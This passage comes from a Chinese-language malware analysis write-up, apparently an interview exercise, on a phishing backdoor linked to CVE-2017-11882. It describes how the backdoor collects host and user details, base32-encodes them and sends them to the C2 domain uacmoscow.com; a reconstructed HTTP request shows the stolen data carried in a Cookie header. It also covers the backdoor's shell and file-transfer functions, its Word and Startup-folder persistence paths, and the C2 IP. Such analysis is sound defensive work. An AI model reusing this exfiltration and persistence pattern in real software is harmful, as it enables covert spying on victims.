+<a class=anchor href=#%e5%be%8c%e9%96%80%e5%8a%9f%e8%83%bd-1>#</a></h3><p>先說明一下這個後門在幹麻，順一下流程</p><ol><li>在main function中實作了一個MD5 hash function，並且從0開始算直到符合<code>ef775988943825d2871e1cfa75473ec0</code>，其實這個就是99999999，我不太確定這一段為什麼要做這件事，可能的原因我想有兩個，其一是想要做到PoW的效果，其二是不想要太快執行到關鍵的地方，讓使用者可以放下戒心，但兩個原因都不太能說服自己就是了</li><li>接著他decode出了類似port的1228這個數字和C2 server name:==uacmoscow.com==，我不太確定這個1228是幹嘛的</li><li>接著進入到while loop想辦法fetch到電腦的一些資訊:<ol><li>Local IP</li><li>OEM Code</li><li>Tick Count(從開機時間開始到現在過了多久)</li><li>目前電腦的架構是多少</li><li>OS版本</li><li>Domain Name</li><li>Username</li><li>Computer Name</li><li>Proxy Server有無開啟</li></ol></li><li>先組織好URI→<code>/ru/order/index.php?strPageID=2396956864</code>，以我的VM為例，我的IP是<code>192.168.222.142</code>，換算成hex就是<code>0x8edea8c0</code></li><li>用base32 encode前面得到的所有電腦資訊，以我的VM為例: <code>KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===</code></li><li>建構封包:<pre tabindex=0><code>Host: uacmoscow.com
+Connection: keep-alive
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ===
+</code></pre></li><li>嘗試用Get方式傳送出去，但是因為這個domain掛了，所以有關於連線的地方大部分都是靜態去看</li><li>如果連線成功他就可以執行以下幾件事情:<ol><li>獲取所有目前process的相關資訊後，利用Post傳送出去→<code>/xhome.native.page/datareader.php?sid=2396956864</code></li><li>終止Process</li><li>開Shell</li><li>從Server傳送資料到Local</li></ol></li></ol><h3 id=常駐方式-1>常駐方式
+<a class=anchor href=#%e5%b8%b8%e9%a7%90%e6%96%b9%e5%bc%8f-1>#</a></h3><p>目前我看到的部分就只有創了以下兩個檔案，前者是只要victim打開word就會觸發到的機置，後者則是當用戶登錄到 Windows 系統時，系統會自動檢查這個目錄，並運行其中的程序或快捷方式</p><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll
+C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
+</code></pre><h2 id=中繼站-1>中繼站
+<a class=anchor href=#%e4%b8%ad%e7%b9%bc%e7%ab%99-1>#</a></h2><h3 id=基本資訊-1>基本資訊
+<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e8%b3%87%e8%a8%8a-1>#</a></h3><p>IP: <code>58.158.177.102</code>
+Domain: <code>uacmoscow.com</code></p><h3 id=關連資訊-1>關連資訊
+<a class=anchor href=#%e9%97%9c%e9%80%a3%e8%b3%87%e8%a8%8a-1>#</a></h3><p>該IP可能來源於日本
+<img src=https://hackmd.io/_uploads/SyKjnVcTp.png alt=圖片>
+:::danger
+根據面試官的說明，這個IP已經被資安公司註冊了，變成如果有Victim連線到這個IP，資安公司就會直接通知，以便做後續的IR或是防止更大範圍的受害
+:::</p><h2 id=威脅情資-1>威脅情資
+<a class=anchor href=#%e5%a8%81%e8%84%85%e6%83%85%e8%b3%87-1>#</a></h2><h3 id=攻擊者-1>攻擊者
+<a class=anchor href=#%e6%94%bb%e6%93%8a%e8%80%85-1>#</a></h3><p>不確定</p><h3 id=攻擊時間-1>攻擊時間
+<a class=anchor href=#%e6%94%bb%e6%93%8a%e6%99%82%e9%96%93-1>#</a></h3><p>不確定</p><h3 id=受害者-1>受害者
+<a class=anchor href=#%e5%8f%97%e5%ae%b3%e8%80%85-1>#</a></h3><p>不確定
+:::danger
+如果把RTF的內容實際打開去看裡面的內容，會發現是一個會議紀錄，如果再更詳細的OSINT可能可以針對這一點去看有可能的受害者是誰
+:::</p><h1 id=reference>Reference
+<a class=anchor href=#reference>#</a></h1><p><a href=https://app.any.run/tasks/af6d9ed7-875e-43d9-a2ea-f3edadd32132/#>Any.Run Analyze Phishing Mail</a>
+<a href=https://ruhunglee.github.io/malware/ml01/>某個以釣魚郵件發起的 APT 攻擊</a></p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://www.solvusoft.com/en/file-extensions/file-extension-xlam/>什麼是XLAM文件擴展名？</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://jingyan.baidu.com/article/d5c4b52b13c12c9b570dc507.html>Excel如何查看VBA代码？</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href="https://youtu.be/ZOALFkVau8c?si=N_Jp4k1NR15LZGDY">Excel教程小白必学技巧 20：调出开发工具选项卡 </a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://www.jendow.com.tw/wiki/%E5%AF%8C%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F>富文本格式</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://www.virustotal.com/gui/file/5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9/community>VirusTotal CVE-2017-11882</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href="https://xz.aliyun.com/t/6668?time__1311=n4%2BxnD0DRDBGitDkDcexlhje0%3D06SOkShx7Ibx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">CVE-2017-11882 Office棧溢出漏洞分析</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p><a href=https://www.freebuf.com/column/183551.html>Office系列漏洞之CVE-2017-11882</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#惡意程式>惡意程式</a><ul><li><a href=#檔案資訊>檔案資訊</a></li><li><a href=#執行流程>執行流程</a></li><li><a href=#通訊協定>通訊協定</a></li><li><a href=#加解密演算法>加解密演算法</a></li><li><a href=#後門功能>後門功能</a></li><li><a href=#常駐方式>常駐方式</a></li></ul></li><li><a href=#中繼站>中繼站</a><ul><li><a href=#基本資訊>基本資訊</a></li><li><a href=#關連資訊>關連資訊</a></li></ul></li><li><a href=#威脅情資>威脅情資</a><ul><li><a href=#攻擊者>攻擊者</a></li><li><a href=#攻擊時間>攻擊時間</a></li><li><a href=#受害者>受害者</a></li></ul></li></ul><ul><li><a href=#惡意程式-1>惡意程式</a><ul><li><a href=#檔案資訊-1>檔案資訊</a></li><li><a href=#執行流程-1>執行流程</a></li><li><a href=#通訊協定-1>通訊協定</a></li><li><a href=#加解密演算法-1>加解密演算法</a></li><li><a href=#後門功能-1>後門功能</a></li><li><a href=#常駐方式-1>常駐方式</a></li></ul></li><li><a href=#中繼站-1>中繼站</a><ul><li><a href=#基本資訊-1>基本資訊</a></li><li><a href=#關連資訊-1>關連資訊</a></li></ul></li><li><a href=#威脅情資-1>威脅情資</a><ul><li><a href=#攻擊者-1>攻擊者</a></li><li><a href=#攻擊時間-1>攻擊時間</a></li><li><a href=#受害者-1>受害者</a></li></ul></li></ul></nav></div></aside></main></body></html>
